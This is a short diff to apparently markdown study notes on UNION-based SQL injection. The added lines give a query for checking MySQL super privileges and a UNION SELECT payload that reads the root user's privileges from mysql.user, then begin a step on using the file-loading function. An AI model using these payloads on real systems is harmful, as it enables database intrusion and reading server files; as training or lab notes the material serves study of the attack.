@@ -98,5 +98,12 @@ Data types from each column MUST be the same, and the number of columns in each 
 2. Determine injection location
 
 #### Data Extraction
+1. Determine privileges
+```
+SELECT super_priv FROM mysql.user
 ```
 ```
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+
+```
+2. Use load file function 
